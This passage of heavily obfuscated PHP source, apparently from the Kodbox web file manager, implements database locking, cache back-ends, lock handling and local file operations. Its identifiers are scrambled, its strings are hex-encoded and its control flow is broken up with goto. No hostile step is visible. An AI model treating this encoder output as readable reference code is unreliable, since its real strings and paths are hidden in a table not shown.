$this->query("\x53\105\x4c\x45\x43\124\40{$â¶‚Ê¢}\56\x63\165\162\162\166\141\x6c\40\143\165\x72\162\166\x61\154\40\106\122\117\x4d\40\x64\165\x61\154"); return $¦¸²Õ„ ? $¦¸²Õ„[0][$œâş¡—À[1033]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($§ ·˜Ï²) { $İçÊ¶çŠ =& $_SERVER[Ş­ğŠìÒ]; if (!CacheLock::fileLock($İçÊ¶çŠ[13])) { return !1; } $É¡¿ùÀã = parent::query($§ ·˜Ï²); CacheLock::fileUnLock($İçÊ¶çŠ[13]); return $É¡¿ùÀã; } public function execute($ë¥ª¼ç) { $Ô¥Îå²  =& $_SERVER[Ş­ğŠìÒ]; if (!CacheLock::fileLock($Ô¥Îå² [13])) { return !1; } $««ãç³è = parent::execute($ë¥ª¼ç); CacheLock::fileUnLock($Ô¥Îå² [13]); return $««ãç³è; } } goto B½½ˆÕÕĞ¥; B´ì™Õæ±¤: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $Æèšøˆ€ =& $_SERVER[Ş­ğŠìÒ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ÃßÚÉ = $GLOBALS[$Æèšøˆ€[6]][$Æèšøˆ€[425]]; $µ÷ûïö = $ÃßÚÉ[$ÃßÚÉ[$Æèšøˆ€[893]]]; $ÇÂé– = $ÃßÚÉ[$Æèšøˆ€[894]]; switch ($ÃßÚÉ[$Æèšøˆ€[893]]) { case $Æèšøˆ€[21]: self::$handle = Model($Æèšøˆ€[895]); break; case $Æèšøˆ€[896]: self::$handle = new CacheRedis($µ÷ûïö, $ÇÂé–); break; case $Æèšøˆ€[897]: self::$handle = new CacheMemcached($µ÷ûïö, $ÇÂé–); break; case $Æèšøˆ€[230]: self::$handle = new CacheFile($µ÷ûïö, $ÇÂé–); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ÂæÚ´˜–) { if (is_array($ÂæÚ´˜–) || is_object($ÂæÚ´˜–)) { $ÂæÚ´˜– = json_encode($ÂæÚ´˜–); } $ÂæÚ´˜– = rawurlencode($ÂæÚ´˜–); return md5(KOD_SITE_ID . $_SERVER[Ş­ğŠìÒ][11] . $ÂæÚ´˜–); } public static function get($“¬Æ´è, $®“ Àö = false) { $¥™ÌÛ‚ = self::key($“¬Æ´è); $õÙ½Æ¼ˆ = self::init(); if ($®“ Àö) { return unserialize($õÙ½Æ¼ˆ->get($¥™ÌÛ‚)); } if (!isset(self::$memoryCache[$¥™ÌÛ‚])) { $…Êğæ˜å = $õÙ½Æ¼ˆ->get($¥™ÌÛ‚); self::$memoryCache[$¥™ÌÛ‚] = unserialize($…Êğæ˜å); } return self::$memoryCache[$¥™ÌÛ‚]; } public static function set($Õ°·¼, $”øí ı, $ñöé«Ñ’ = false) { $ş«Ÿ«³Ö =& $_SERVER[Ş­ğŠìÒ]; $“çŒïíû = self::key($Õ°·¼); if (isset(self::$memoryCache[$“çŒïíû]) && self::$memoryCache[$“çŒïíû] === $”øí ı) { return !0; } if ($ñöé«Ñ’ === 0) { self::$memoryCache[$“çŒïíû] = $”øí ı; return !0; } $¯È³Î¿ = self::init(); $€ñÇÀ° = serialize($”øí ı); CacheLock::lock($Õ°·¼ . $ş«Ÿ«³Ö[898]); $‰®°¾›¯ = $¯È³Î¿->set($“çŒïíû, $€ñÇÀ°, $ñöé«Ñ’); self::$memoryCache[$“çŒïíû] = $”øí ı; CacheLock::unlock($Õ°·¼ . $ş«Ÿ«³Ö[898]); return $‰®°¾›¯; } public static function getCall($øõ”½á¸, $Öª‘šç¸, $àŞ¹â, $û®¾Ø“ô = array()) { $©­›€Í =& $_SERVER[Ş­ğŠìÒ]; $ØıĞ‡À‰ = self::get($øõ”½á¸); if ($ØıĞ‡À‰ || $ØıĞ‡À‰ === $©­›€Í[12]) { return $ØıĞ‡À‰; } $ØıĞ‡À‰ = call_user_func_array($àŞ¹â, $û®¾Ø“ô); $ØıĞ‡À‰ = $ØıĞ‡À‰ ? $ØıĞ‡À‰ : $©­›€Í[12]; self::set($øõ”½á¸, $ØıĞ‡À‰, $Öª‘šç¸); return $ØıĞ‡À‰; } public static function remove($äÃêñ©¶) { $øˆô¦ó = self::key($äÃêñ©¶); unset(self::$memoryCache[$øˆô¦ó]); self::clearTimeout(); CacheLock::lock($äÃêñ©¶); $û¦É‚Úœ = self::init()->remove($øˆô¦ó); CacheLock::unlock($äÃêñ©¶); return $û¦É‚Úœ; } public static function removeMemory($ºÏªÙ»†) { $äïÏ¸ˆÍ = self::key($ºÏªÙ»†); unset(self::$memoryCache[$äïÏ¸ˆÍ]); } public static function clearMemory($É¯èœø = false) { if ($É¯èœø) { $É¯èœø = self::key($É¯èœø); unset(self::$memoryCache[$É¯èœø]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ş­ğŠìÒ][899])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ş­ğŠìÒ][900])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($äšÆ¸‘”, $ÄğÅíØË) { $ñ‚©ïæƒ =& $_SERVER[Ş­ğŠìÒ]; $this->cachePath = $äšÆ¸‘”[$ñ‚©ïæƒ[87]]; $this->prefix = $ñ‚©ïæƒ[901]; $this->cacheTime = $ÄğÅíØË; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ğ§šùŞ…) { $‘‘½·Š½ =& $_SERVER[Ş­ğŠìÒ]; $ğ§šùŞ… = str_replace(array($‘‘½·Š½[902], $‘‘½·Š½[100], $‘‘½·Š½[76]), $‘‘½·Š½[903], $ğ§šùŞ…); return $this->cachePath . $‘‘½·Š½[904] . $ğ§šùŞ… . $‘‘½·Š½[905]; } public function set($Åøå›‡², $ßşû˜ë—, $Şıâ´Ğµ = false) { $Şıâ´Ğµ = $Şıâ´Ğµ ? $Şıâ´Ğµ : $this->cacheTime; $š†ğÀÎ = $this->getFile($Åøå›‡²); if (file_put_contents($š†ğÀÎ, $this->prefix . $ßşû˜ë—, LOCK_EX)) { @touch($š†ğÀÎ, intval(time() + $Şıâ´Ğµ)); clearstatcache(); return !0; } @unlink($š†ğÀÎ); return !1; } public function get($Ş«Û¡¾ş) { $–úû¨–¥ = $this->getFile($Ş«Û¡¾ş); if (file_exists($–úû¨–¥) && filemtime($–úû¨–¥) < time()) { @unlink($–úû¨–¥); return !1; } $µé‚ÒÙÜ = @file_get_contents($–úû¨–¥); return substr($µé‚ÒÙÜ, strlen($this->prefix)); } public function remove($‚Ãªíö) { $Á¡ù¥”­ = $this->getFile($‚Ãªíö); return @unlink($Á¡ù¥”­); } public function deleteAll() { $á…µì²Í =& $_SERVER[Ş­ğŠìÒ]; $÷¦âò§‘ = scandir($this->cachePath); foreach ($÷¦âò§‘ as $•„) { $—¦ÕÌä = $this->cachePath . $•„; if (strpos($—¦ÕÌä, $á…µì²Í[905]) && strpos($—¦ÕÌä, $á…µì²Í[906])) { @unlink($—¦ÕÌä); } } } public function clearTimeout() { $ÚùÇá€Õ =& $_SERVER[Ş­ğŠìÒ]; $ï¢ªØ°ò = scandir($this->cachePath); foreach ($ï¢ªØ°ò as $­‰¦…—ì) { $­î¦†…å = $this->cachePath . $­‰¦…—ì; if (strpos($­î¦†…å, $ÚùÇá€Õ[905]) && strpos($­î¦†…å, $ÚùÇá€Õ[906]) && filemtime($­î¦†…å) < time()) { @unlink($­î¦†…å); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $«±Ö”ïŞ =& $_SERVER[Ş­ğŠìÒ]; if (self::$handle) { return self::$handle; } $Îø£Ğä¥ = $GLOBALS[$«±Ö”ïŞ[6]][$«±Ö”ïŞ[425]]; self::$timeout = $Îø£Ğä¥[$«±Ö”ïŞ[907]] ? $Îø£Ğä¥[$«±Ö”ïŞ[907]] : 10; $“ºÀ±¶Ã = _get($GLOBALS[$«±Ö”ïŞ[6]], $«±Ö”ïŞ[908]); $ä’­ã— = $Îø£Ğä¥[$«±Ö”ïŞ[893]] ? $Îø£Ğä¥[$«±Ö”ïŞ[893]] : $«±Ö”ïŞ[230]; if ($ä’­ã— == $«±Ö”ïŞ[21] && $“ºÀ±¶Ã == $«±Ö”ïŞ[13]) { $ä’­ã— = $«±Ö”ïŞ[230]; } switch ($ä’­ã—) { case $«±Ö”ïŞ[896]: self::$handle = new CacheLockRedis(); break; case $«±Ö”ïŞ[897]: self::$handle = new CacheLockMemcached(); break; case $«±Ö”ïŞ[21]: self::$handle = new CacheLockDatabase(); break; case $«±Ö”ïŞ[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($«±Ö”ïŞ[909], $«±Ö”ïŞ[910]); } return self::$handle; } private static function key($¦À™æ¦) { return $_SERVER[Ş­ğŠìÒ][911] . Cache::key($¦À™æ¦); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($™ıˆÈÓî = '') { self::$errorMsg = $™ıˆÈÓî; } public static function lockGlobal($”ºå—Êß, $Ø™ËÇı) { return self::lock($”ºå—Êß, $Ø™ËÇı, !0); } public static function lock($¿ã¬²ßÏ, $öÉö¶¡– = false, $Ö­ßÄ±ë = false) { $·õçŠ»¤ =& $_SERVER[Ş­ğŠìÒ]; $ÛÅîè¶£ = self::init(); $ÛéåìŒœ = self::key($¿ã¬²ßÏ); $öÉö¶¡– = $öÉö¶¡– ? $öÉö¶¡– : self::$timeout; $£œÀœÁŠ = timeFloat(); $øù¦ñŠ = $ÛÅîè¶£->lock($ÛéåìŒœ, $öÉö¶¡–); $ĞşéãûŒ = timeFloat(); if (!$øù¦ñŠ) { $ÚŞç¥¾º = "\x6c\157\x63\x6b\x20\x65\162\162\157\x72\73\153\145\171\x3d{$¿ã¬²ßÏ}\73\164\151\155\x65\x3d{$öÉö¶¡–}\73" . self::$errorMsg . $·õçŠ»¤[74] . get_caller_msg(); $ˆî©ò±í = LNG($·õçŠ»¤[912]) . "\x28{$öÉö¶¡–}\163\x29\x2e" . LNG($·õçŠ»¤[913]); $ˆî©ò±í .= $·õçŠ»¤[914]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ˆî©ò±í = $ˆî©ò±í . $·õçŠ»¤[915] . self::$errorMsg; } write_log($·õçŠ»¤[916] . sprintf($·õçŠ»¤[917], timeFloat() - $£œÀœÁŠ) . $·õçŠ»¤[918] . $ÚŞç¥¾º . $·õçŠ»¤[919] . error_get_last(), $·õçŠ»¤[910]); show_json($ˆî©ò±í, !1); } if (!$Ö­ßÄ±ë) { self::$lockItem[$ÛéåìŒœ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ó°ûÀŞ¶ = number_format(timeFloat() - $ĞşéãûŒ, 3); write_log($·õçŠ»¤[920] . $¿ã¬²ßÏ . $·õçŠ»¤[921] . $ó°ûÀŞ¶, $·õçŠ»¤[910]); } return $øù¦ñŠ; } public static function lockGet($¨öĞ™àÄ) { $ö³æÇñ  = self::key($¨öĞ™àÄ); if (self::$lockItem[$ö³æÇñ ]) { return self::$lockItem[$ö³æÇñ ]; } return self::init()->lockGet($ö³æÇñ ); } public static function unlock($Á•˜½ Ñ) { $ù¿Ù‹¨† =& $_SERVER[Ş­ğŠìÒ]; $ÃÀØÉØµ = self::key($Á•˜½ Ñ); self::$lockItem[$ÃÀØÉØµ] = null; self::init()->unlock($ÃÀØÉØµ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ù¿Ù‹¨†[922] . $Á•˜½ Ñ, $ù¿Ù‹¨†[910]); } return; } public static function unlockRuntime() { $™ÕÌéùÉ =& $_SERVER[Ş­ğŠìÒ]; $³õ‹ƒµ = self::init(); $³³Ğ“öä = !1; foreach (self::$lockItem as $ê—üÀ¬Î => $×Á¬Œ‘ª) { if (!$×Á¬Œ‘ª) { continue; } $³õ‹ƒµ->unlock($ê—üÀ¬Î); if (!$³³Ğ“öä) { $³³Ğ“öä = !0; write_log($™ÕÌéùÉ[923] . $ê—üÀ¬Î . $™ÕÌéùÉ[74] . get_caller_msg(), $™ÕÌéùÉ[910]); continue; } write_log($™ÕÌéùÉ[923] . $ê—üÀ¬Î, $™ÕÌéùÉ[910]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ÉÛÚ‰ƒ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($™ÕÌéùÉ[924] . $ÉÛÚ‰ƒ . $™ÕÌéùÉ[925] . ACTION, $™ÕÌéùÉ[910]); } } public static function fileLock($ÆÃ…í£Ó) { $Ø†æ§ê =& $_SERVER[Ş­ğŠìÒ]; if (!$GLOBALS[$Ø†æ§ê[926]]) { $GLOBALS[$Ø†æ§ê[926]] = array(); } $GLOBALS[$Ø†æ§ê[926]][$ÆÃ…í£Ó] = !1; $Ú»Ë–Ù = fopen(DATA_PATH . $ÆÃ…í£Ó . $Ø†æ§ê[927], $Ø†æ§ê[928]); if (!$Ú»Ë–Ù) { return !1; } $GLOBALS[$Ø†æ§ê[926]][$ÆÃ…í£Ó] = $Ú»Ë–Ù; if (flock($Ú»Ë–Ù, LOCK_EX)) { return !0; } self::unlock($ÆÃ…í£Ó); show_json($Ø†æ§ê[929], !1); return !1; } public static function fileUnlock($‰˜ëÅí‘) { $‡ÆËãÆŠ =& $_SERVER[Ş­ğŠìÒ]; $¥´áÚÉº = $GLOBALS[$‡ÆËãÆŠ[926]][$‰˜ëÅí‘]; if (!$¥´áÚÉº) { return; } $GLOBALS[$‡ÆËãÆŠ[926]][$‰˜ëÅí‘] = !1; flock($¥´áÚÉº, LOCK_UN); fclose($¥´áÚÉº); } public static function fileUnlockAll() { $ã‹™Ğå =& $_SERVER[Ş­ğŠìÒ]; if (!isset($GLOBALS[$ã‹™Ğå[926]]) || !$GLOBALS[$ã‹™Ğå[926]]) { return; } foreach ($GLOBALS[$ã‹™Ğå[926]] as $ü÷€¥Ëû => $ÆÚô Û) { if (!$ÆÚô Û) { continue; } $GLOBALS[$ã‹™Ğå[926]][$ü÷€¥Ëû] = !1; flock($ÆÚô Û, LOCK_UN); fclose($ÆÚô Û); } $GLOBALS[$ã‹™Ğå[926]] = array(); } } goto D¼‡¸ÕˆÕå; aŠ¢Ê‘Ÿ‰µ: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($é¦õÃáÂ) { if (substr($é¦õÃáÂ, 0, 2) == $_SERVER[Ş­ğŠìÒ][1406]) { $é¦õÃáÂ = BASIC_PATH . substr($é¦õÃáÂ, 2); } return $é¦õÃáÂ; } public function iconvApp($á¯»‰Û) { $„–åä„… =& $_SERVER[Ş­ğŠìÒ]; global $config; return $this->iconvTo($á¯»‰Û, $config[$„–åä„…[1433]], $config[$„–åä„…[1432]]); } public function iconvSystem($µíËùº¿) { $Î“ÏÉØ¾ =& $_SERVER[Ş­ğŠìÒ]; global $config; return $this->iconvTo($µíËùº¿, $config[$Î“ÏÉØ¾[1432]], $config[$Î“ÏÉØ¾[1433]]); } public function getPathOuter($ËëÄ¾…‚) { $¸ö¼ıêÎ =& $_SERVER[Ş­ğŠìÒ]; $„Ş»åÙ‘ = $this->iconvApp($this->pathBase); $ËëÄ¾…‚ = $this->iconvApp($ËëÄ¾…‚); if (substr($„Ş»åÙ‘, 0, 2) == $¸ö¼ıêÎ[1406]) { $„Ş»åÙ‘ = BASIC_PATH . substr($„Ş»åÙ‘, 2); } if (substr($ËëÄ¾…‚, 0, 2) == $¸ö¼ıêÎ[1406]) { $ËëÄ¾…‚ = BASIC_PATH . substr($ËëÄ¾…‚, 2); } $„Ş»åÙ‘ = KodIO::clear($„Ş»åÙ‘); $ËëÄ¾…‚ = KodIO::clear($ËëÄ¾…‚); $ËëÄ¾…‚ = substr($ËëÄ¾…‚, strlen($„Ş»åÙ‘)); if (empty($this->pathDriver)) { return $ËëÄ¾…‚; } return $this->pathDriver . $¸ö¼ıêÎ[8] . ltrim($ËëÄ¾…‚, $¸ö¼ıêÎ[8]); } public function mkfile($ˆ³Ø‹äØ, $Şß®Õ¾ğ = '', $Á¯¤ïƒ½ = REPEAT_RENAME) { $ˆ³Ø‹äØ = $this->iconvSystem($ˆ³Ø‹äØ); @touch($ˆ³Ø‹äØ); if ($Şß®Õ¾ğ) { file_put_contents($ˆ³Ø‹äØ, $Şß®Õ¾ğ); } @chmod($ˆ³Ø‹äØ, $this->pathAuth); if (is_file($ˆ³Ø‹äØ)) { return $this->getPathOuter($ˆ³Ø‹äØ); } $this->writeLog(__FUNCTION__ . $_SERVER[Ş­ğŠìÒ][1444], !0); return !1; } public function mkdir($ÚÈ„å¼å, $Ã¯÷í÷å = REPEAT_SKIP) { $ÚÈ„å¼å = $this->iconvSystem($ÚÈ„å¼å); if (is_dir($ÚÈ„å¼å)) { return $this->getPathOuter($ÚÈ„å¼å); } @mkdir($ÚÈ„å¼å, $this->pathAuth, !0); @chmod($ÚÈ„å¼å, $this->pathAuth); if (is_dir($ÚÈ„å¼å)) { return $this->getPathOuter($ÚÈ„å¼å); } $this->writeLog(__FUNCTION__ . $_SERVER[Ş­ğŠìÒ][1444], !0); return !1; } public function copyFile($ªïÜ†™˜, $¾·ùˆ) { $this->mkdir($this->pathFather($¾·ùˆ)); $ªïÜ†™˜ = $this->iconvSystem($ªïÜ†™˜); $¾·ùˆ = $this->iconvSystem($¾·ùˆ); $ÎÑó„« = copy_64($ªïÜ†™˜, $¾·ùˆ); @chmod($¾·ùˆ, $this->pathAuth); if ($ÎÑó„«) { return $this->getPathOuter($¾·ùˆ); } $this->writeLog(__FUNCTION__ . $_SERVER[Ş­ğŠìÒ][1444], !0); return !1; } public function moveFile($õşÁø½, $ƒÛŒ¿ÀÇ) { $this->mkdir($this->pathFather($ƒÛŒ¿ÀÇ)); $õşÁø½ = $this->iconvSystem($õşÁø½); $ƒÛŒ¿ÀÇ = $this->iconvSystem($ƒÛŒ¿ÀÇ); $öİ¾â‰Ì = intval(@rename($õşÁø½, $ƒÛŒ¿ÀÇ)); if (!$öİ¾â‰Ì) { if ($öİ¾â‰Ì = intval(@copy_64($õşÁø½, $ƒÛŒ¿ÀÇ))) { @unlink($õşÁø½); } } @chmod($ƒÛŒ¿ÀÇ, $this->pathAuth); if ($öİ¾â‰Ì) { return $this->getPathOuter($ƒÛŒ¿ÀÇ); } $this->writeLog(__FUNCTION__ . $_SERVER[Ş­ğŠìÒ][1444], !0); return !1; } public function movePath($ÎÒïºÖ«, $¨ÊÛ¾ê™, $ë¾Åêıñ = false) { $¢–ÉÉÇ³ =& $_SERVER[Ş­ğŠìÒ]; $ÎÒïºÖ« = $this->iconvSystem($ÎÒïºÖ«); $¨ÊÛ¾ê™ = $this->iconvSystem($¨ÊÛ¾ê™); $šîØÇÁ = rtrim($¨ÊÛ¾ê™, $¢–ÉÉÇ³[8]) . $¢–ÉÉÇ³[8] . ($ë¾Åêıñ ? $ë¾Åêıñ : get_path_this($ÎÒïºÖ«)); if (file_exists($šîØÇÁ)) { return !1; } $ô°›ë¾¤ = intval(@rename($ÎÒïºÖ«, $šîØÇÁ)); $ô°›ë¾¤ = file_exists($šîØÇÁ); if ($ô°›ë¾¤) { return $this->getPathOuter($šîØÇÁ); } $this->writeLog(__FUNCTION__ . $¢–ÉÉÇ³[1444], !0); return !1; } public function delFile($‹ÉÎš×İ) { $‹ÉÎš×İ = $this->iconvSystem($‹ÉÎš×İ); if (!@unlink($‹ÉÎš×İ)) { @chmod($‹ÉÎš×İ, $this->pathAuth); if (@unlink($‹ÉÎš×İ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[Ş­ğŠìÒ][1444], !0); return !1; } return !0; } public function delFolder($æÊÖş‹Â) { $ÁÁé»³± =& $_SERVER[Ş­ğŠìÒ]; $æÊÖş‹Â = $this->iconvSystem($æÊÖş‹Â); if (!is_dir($æÊÖş‹Â)) { return !0; } if (!($ÀÎêŠØµ = opendir($æÊÖş‹Â))) { return !1; } while (($¾§¥¥ = readdir($ÀÎêŠØµ)) !== !1) { if ($¾§¥¥ == $ÁÁé»³±[10] || $¾§¥¥ == $ÁÁé»³±[1359]) { continue; } $İ¾£Ö©Î = $æÊÖş‹Â . $ÁÁé»³±[8] . $¾§¥¥; if (is_file($İ¾£Ö©Î) || is_link($İ¾£Ö©Î)) { if (!unlink($İ¾£Ö©Î)) { chmod($İ¾£Ö©Î, $this->pathAuth); if (!unlink($İ¾£Ö©Î)) { return !1; } } } else { if (is_dir($İ¾£Ö©Î)) { chmod($İ¾£Ö©Î, $this->pathAuth); $İ¾£Ö©Î = $this->iconvApp($İ¾£Ö©Î); if (!$this->delFolder($İ¾£Ö©Î)) { return !1; } } } } closedir($ÀÎêŠØµ); return rmdir($æÊÖş‹Â); } public function rename($ÌæÌØ“é, $ÜÕóÕÑÎ) { $—§ÈÊÖŒ =& $_SERVER[Ş­ğŠìÒ]; $ø–ƒ±À× = $this->fileNameAuto($this->pathFather($ÌæÌØ“é), $ÜÕóÕÑÎ); $ø–ƒ±À× = $this->iconvSystem($ø–ƒ±À×); $ÌæÌØ“é = $this->iconvSystem($ÌæÌØ“é); $®ØŞ¥¯ = $this->pathFather($ÌæÌØ“é); $¤ˆàÔ® = rtrim($®ØŞ¥¯, $—§ÈÊÖŒ[8]) . $—§ÈÊÖŒ[8] . $ø–ƒ±À×; $•ğäë‘ = @rename($ÌæÌØ“é, $¤ˆàÔ®); $¤ˆàÔ® = $this->iconvApp($¤ˆàÔ®); if ($•ğäë‘) { return $this->getPathOuter($¤ˆàÔ®); } $this->writeLog(__FUNCTION__ . $—§ÈÊÖŒ[1444], !0); return !1; } public function size($£ê‡®á˜) { $£ê‡®á˜ = $this->iconvSystem($£ê‡®á˜); return filesize_64($£ê‡®á˜); } public function info($½¼Ö½õÌ) { $½¼Ö½õÌ = $this->iconvSystem($½¼Ö½õÌ); if ($this->isFolder($½¼Ö½õÌ)) { return $this->folderInfo($½¼Ö½õÌ); } else { if ($this->isFile($½¼Ö½õÌ)) { return $this->fileInfo($½¼Ö½õÌ); } } return !1; } protected function infoChildren($‹’é‰·¿, &$È±ô™, $™ï÷©ö¸ = true) { $Ş·„å•à =& $_SERVER[Ş­ğŠìÒ]; check_abort_echo(); $‹’é‰·¿ = rtrim($‹’é‰·¿, $Ş·„å•à[8]) . $Ş·„å•à[8]; if ($™ï÷©ö¸) { $‹’é‰·¿ = $this->iconvSystem($‹’é‰·¿); } if (!($æÈÜÄ¹ = @opendir($‹’é‰·¿))) { return; } while (($àèŸ·œ« = readdir($æÈÜÄ¹)) !== !1) { if ($àèŸ·œ« == $Ş·„å•à[10] || $àèŸ·œ« == $Ş·„å•à[1359]) { continue; } $‹İéõ†Ñ = $‹’é‰·¿ . $àèŸ·œ«; if (is_file($‹İéõ†Ñ) || is_link($‹İéõ†Ñ)) { $È±ô™[$Ş·„å•à[80]]++; $È±ô™[$Ş·„å•à[79]] += filesize_64($‹İéõ†Ñ); } else { if (is_dir($‹İéõ†Ñ)) { $È±ô™[$Ş·„å•à[81]]++; $this->infoChildren($‹İéõ†Ñ, $È±ô™, !1); } } } closedir($æÈÜÄ¹); } private function folderInfo($¤•ùòË¬, $ô ™´œˆ = false) { $¤ãø‹ï¸ =& $_SERVER[Ş­ğŠìÒ]; $¤•ùòË¬ = rtrim($¤•ùòË¬, $¤ãø‹ï¸[8]) . $¤ãø‹ï¸[8]; $ºÛëé™ˆ = $this->iconvApp($this->pathThis($¤•ùòË¬)); if ($ô ™´œˆ) { return array($¤ãø‹ï¸[32] => $ºÛëé™ˆ, $¤ãø‹ï¸[87] => $this->getPathOuter($¤•ùòË¬), $¤ãø‹ï¸[33] => $¤ãø‹ï¸[78]); } $ÏşÔâ”Æ = array($¤ãø‹ï¸[32] => $ºÛëé™ˆ, $¤ãø‹ï¸[87] => $this->getPathOuter($¤•ùòË¬), $¤ãø‹ï¸[33] => $¤ãø‹ï¸[78], $¤ãø‹ï¸[231] => @filectime($¤•ùòË¬), $¤ãø‹ï¸[88] => @filemtime($¤•ùòË¬), $¤ãø‹ï¸[1448] => @fileatime($¤•ùòË¬), $¤ãø‹ï¸[1449] => is_readable($¤•ùòË¬), $¤ãø‹ï¸[1450] => is_writable($¤•ùòË¬), $¤ãø‹ï¸[1451] => get_mode($¤•ùòË¬)); return $ÏşÔâ”Æ; } private function fileInfo($¹«ÓÈ£õ, $ÏŸû‚Á = false) { $’ù‘è‡ =& $_SERVER[Ş­ğŠìÒ]; $ºùÙ Õõ = $this->iconvApp($this->pathThis($¹«ÓÈ£õ)); if ($ÏŸû‚Á) { return array($’ù‘è‡[32] => $ºùÙ Õõ, $’ù‘è‡[87] => $this->getPathOuter($¹«ÓÈ£õ), $’ù‘è‡[33] => $’ù‘è‡[230], $’ù‘è‡[79] => $this->size($¹«ÓÈ£õ), $’ù‘è‡[169] => $this->ext($ºùÙ Õõ)); } $‰˜ÃŞßó = array($’ù‘è‡[32] => $ºùÙ Õõ, $’ù‘è‡[87] => $this->getPathOuter($¹«ÓÈ£õ), $’ù‘è‡[33] => $’ù‘è‡[230], $’ù‘è‡[231] => @filectime($¹«ÓÈ£õ), $’ù‘è‡[88] => @filemtime($¹«ÓÈ£õ), $’ù‘è‡[1448] => @fileatime($¹«ÓÈ£õ), $’ù‘è‡[79] => $this->size($¹«ÓÈ£õ), $’ù‘è‡[169] => $this->ext($ºùÙ Õõ), $’ù‘è‡[1449] => is_readable($¹«ÓÈ£õ), $’ù‘è‡[1450] => is_writable($¹«ÓÈ£õ), $’ù‘è‡[1451] => get_mode($¹«ÓÈ£õ)); return $‰˜ÃŞßó; } public function exist($îÏœ†óÊ) { $îÏœ†óÊ = $this->iconvSystem($îÏœ†óÊ); return @file_exists($îÏœ†óÊ); } public function isFile($ü†Ê°åÛ) { $ü†Ê°åÛ = $this->iconvSystem($ü†Ê°åÛ); return @is_file($ü†Ê°åÛ); } public function isFolder($€æ¡ØéØ) { $€æ¡ØéØ = $this->iconvSystem($€æ¡ØéØ); return @is_dir($€æ¡ØéØ); } public function listPath($“‘ü÷ ±, $Ä—‡ğŠ° = false) { $ ¶¡£à =& $_SERVER[Ş­ğŠìÒ]; $“‘ü÷ ± = $this->iconvSystem($“‘ü÷ ±); $“‘ü÷ ± = rtrim($“‘ü÷ ±, $ ¶¡£à[8]) . $ ¶¡£à[8]; $Í¦ÈËõ› = array($ ¶¡£à[85] => array(), $ ¶¡£à[86] => array()); if (!($ì·û£Üè = @opendir($“‘ü÷ ±))) { return $Í¦ÈËõ›; } while (($Õªï‹¦– = readdir($ì·û£Üè)) !== !1) { if ($Õªï‹¦– == $ ¶¡£à[10] || $Õªï‹¦– == $ ¶¡£à[1359]) { continue; } $ª·Ö“ú‹ = $“‘ü÷ ± . $Õªï‹¦–; if (is_file($ª·Ö“ú‹)) { $Í¦ÈËõ›[$ ¶¡£à[86]][] = $this->fileInfo($ª·Ö“ú‹, $Ä—‡ğŠ°); } else { $Í¦ÈËõ›[$ ¶¡£à[85]][] = $this->folderInfo($ª·Ö“ú‹, $Ä—‡ğŠ°); } } closedir($ì·û£Üè); return $Í¦ÈËõ›; } public function listAll($®âøô¤Ì, &$ïÆÙè­ = array()) { $÷œğ‰†á =& $_SERVER[Ş­ğŠìÒ]; $®âøô¤Ì = $this->iconvSystem($®âøô¤Ì); $®âøô¤Ì = rtrim($®âøô¤Ì, $÷œğ‰†á[8]) . $÷œğ‰†á[8]; if (!($™Ü·™÷ç = @opendir($®âøô¤Ì))) { return $ïÆÙè­; } while (($ã÷ÏÑí“ = readdir($™Ü·™÷ç)) !== !1) { if ($ã÷ÏÑí“ == $÷œğ‰†á[10] || $ã÷ÏÑí“ == $÷œğ‰†á[1359]) { continue; } $Úƒ³£Ø = $®âøô¤Ì . $ã÷ÏÑí“; $ó¹ˆõ±ä = is_dir($Úƒ³£Ø) && !is_link($Úƒ³£Ø) ? 1 : 0; $Úƒ³£Ø = $ó¹ˆõ±ä ? $Úƒ³£Ø . $÷œğ‰†á[8] : $Úƒ³£Ø; $ïÆÙè­[] = array($÷œğ‰†á[87] => $Úƒ³£Ø, $÷œğ‰†á[78] => $ó¹ˆõ±ä, $÷œğ‰†á[88] => intval(@filemtime($Úƒ³£Ø)), $÷œğ‰†á[79] => $ó¹ˆõ±ä ? 0 : intval($this->size($Úƒ³£Ø))); if ($ó¹ˆõ±ä) { $this->listAll($Úƒ³£Ø, $ïÆÙè­); } } closedir($™Ü·™÷ç); return $ïÆÙè­; } public function has($óØ¾©ÜØ, $ÁÁî–±ö = false, $Ä‹ó—œó = true) { $ûï‰ıµ† =& $_SERVER[Ş­ğŠìÒ]; $óØ¾©ÜØ = $this->iconvSystem($óØ¾©ÜØ); $óØ¾©ÜØ = rtrim($óØ¾©ÜØ, $ûï‰ıµ†[8]) . $ûï‰ıµ†[8]; if (!($£Õ¿¨ÓÇ = @opendir($óØ¾©ÜØ))) { return !1; } $¢‹©åÀÀ = 0; $âÉ¾¢Õ“ = 0; $Ä±²”à÷ = 0; while (($®«ù½›¢ = readdir($£Õ¿¨ÓÇ)) !== !1) { if ($®«ù½›¢ == $ûï‰ıµ†[10] || $®«ù½›¢ == $ûï‰ıµ†[1359]) { continue; } $Ó¨ıÂüµ = $óØ¾©ÜØ . $®«ù½›¢; if ($ÁÁî–±ö) { $Ä±²”à÷++; if (@is_file($Ó¨ıÂüµ)) { $¢‹©åÀÀ++; } else { $âÉ¾¢Õ“++; } if 